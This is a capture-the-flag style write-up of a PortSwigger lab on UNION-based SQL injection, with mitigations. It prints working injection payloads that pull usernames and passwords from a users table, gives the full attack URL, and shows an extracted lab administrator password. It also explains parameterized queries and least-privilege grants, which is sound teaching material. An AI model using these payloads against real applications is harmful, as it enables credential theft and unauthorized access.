# SQL Injection UNION Attack - Retrieving Data from Other Tables

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection  
**Difficulty:** Practitioner  
**Date:** March 2026

---

## Objective

Extract usernames and passwords from the `users` table using a UNION-based SQL injection attack, then log in as the administrator.

---

## Vulnerability

The application allows UNION-based SQL injection in the product category filter. After identifying the query structure (2 columns, both text-compatible), we can now extract sensitive data from other database tables.

**Backend Query Structure:**
```sql
SELECT name, description FROM products WHERE category = 'USER_INPUT'
```

**Developer Mistake:**  
- **No input sanitization** allowing arbitrary SQL injection
- **Excessive database permissions** — the application's database user can query the `users` table
- **No query result filtering** — any data returned is displayed on the page
- **Weak separation of concerns** — product queries have access to authentication data

This violates the **principle of least privilege**. The database account used for product lookups should never have access to user credentials.

---

## Understanding the Attack
### The Target:
We need to extract data from the `users` table, which typically has:
- `username` column (text)
- `password` column (text)

### The Plan:
Replace the product query columns with username and password from the users table.

---

## Steps

1. **Confirmed prerequisites**
   - Knew the query has 2 columns (both text-compatible)
   - Base payload from previous labs: `' UNION SELECT NULL,NULL--`

2. **Identified the target table**
   - Target: `users` table
   - Columns needed: `username`, `password`

3. **Crafted the data extraction payload**
   - Payload: `' UNION SELECT username,password FROM users--`
   - This replaces the product columns with user credentials

4. **Executed the injection**
   - Navigated to: `/filter?category=Pets' UNION SELECT username,password FROM users--`
   - Result: User credentials displayed on the page

5. **Retrieved administrator credentials**
   - Username: `administrator`
   - Password: `avll7z5jgmnm23cdox4y`

6. **Logged in as administrator**
   - Used extracted credentials to access admin account
   - Lab solved ✅

---

## Payload

```sql
' UNION SELECT username,password FROM users--
```

**Complete URL:**
```
/filter?category=Pets' UNION SELECT username,password FROM users--
```

**Resulting SQL Query:**
```sql
SELECT name, description FROM products WHERE category = 'Pets'
UNION
SELECT username, password FROM users--'
```

**What happens:**
- `Pets'` closes the category string
- `UNION` combines product results with user data
- `SELECT username,password FROM users` retrieves all user credentials
- Credentials are displayed alongside products on the page
- `--` comments out trailing SQL

**Extracted Data:**
```
administrator : avll7z5jgmnm23cdox4y
```

---

## The Complete UNION Attack Chain

This lab represents the culmination of the UNION reconnaissance process:

| Step | Lab | What We Found | Payload |
|------|-----|---------------|---------|
| 1 | Lab 3 | Query has 2 columns | `' UNION SELECT NULL,NULL--` |
| 2 | Lab 4 | Both columns are text | `' UNION SELECT 'test','test'--` |
| 3 | Lab 5 | Extract real data | `' UNION SELECT username,password FROM users--` |

**This is how real data breaches happen.**

---

## What I Learned

1. **UNION attacks are methodical** — reconnaissance before exploitation
2. **Database permissions matter** — principle of least privilege could prevent this
3. **All user data is exposed** — not just admin, every user in the table
4. **The attack is silent** — no failed logins, no brute force detection
5. **This works because** the app displays query results directly without validation

---

## Real-World Impact

This vulnerability pattern enables attackers to:
- **Dump entire user databases** including passwords
- **Bypass authentication** without triggering failed login alerts
- **Steal PII** (personal identifiable information)
- **Escalate privileges** by extracting admin credentials
- **Remain undetected** — no abnormal authentication attempts logged


---

## Mitigation

**For Developers:**
- Use **parameterized queries** (prepared statements) — the primary defense
- Implement **principle of least privilege** — separate DB users for different functions
- **Never store passwords in plaintext** — use bcrypt, Argon2, or PBKDF2
- Apply **input validation** as defense-in-depth
- **Limit query result display** — don't output raw database rows to pages

**Example Fix (Python):**
```python
# ❌ Vulnerable
query = f"SELECT * FROM products WHERE category = '{user_input}'"

# ✅ Secure
query = "SELECT * FROM products WHERE category = ?"
cursor.execute(query, (user_input,))
```

**Database Security:**
```sql
-- ❌ Vulnerable - app user has full access
GRANT ALL PRIVILEGES ON database.* TO 'webapp'@'localhost';

-- ✅ Secure - principle of least privilege
GRANT SELECT ON database.products TO 'webapp'@'localhost';
-- No access to users table
```
